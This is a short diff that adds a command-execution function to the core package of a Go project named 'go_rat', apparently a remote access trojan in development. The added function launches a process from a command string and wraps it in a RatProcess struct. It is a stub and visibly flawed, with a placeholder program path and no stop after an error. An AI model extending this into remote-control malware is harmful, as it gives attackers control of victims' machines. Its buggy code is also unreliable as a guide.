@@ -4,10 +4,37 @@ This file contains the functions necessary for new commands and stuff lol
 /*/
 package Core
 
+import (
+	"go_rat/pkg/shared_code/ErrorHandling"
+	"os"
+)
+
+//function to execute command in a linux environment
+// Takes a Command struct
+// returns RatProcess struct
+func exec_command(command_struct *Command) *RatProcess {
+	shell_arguments := command_struct.Command_string
+	attributes := os.ProcAttr{
+		Dir: "./",
+		// Env not used
+		// File not used
+	}
+	herp, derp := os.StartProcess("shell command", shell_arguments, &attributes)
+	if derp != nil {
+		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		//return
+	}
+	new_process := RatProcess{
+		Pid:     herp.Pid,
+		Process: herp,
+	}
+	return &new_process
+}
+
 /*/
 Must have a way of constructing new structs,
 they are structures, you must build them
-One for each in this project
+only need a constructor if they need parameters assigned at birth
 /*/
 
 // cant have multiple commands without something to represent a CommandSet
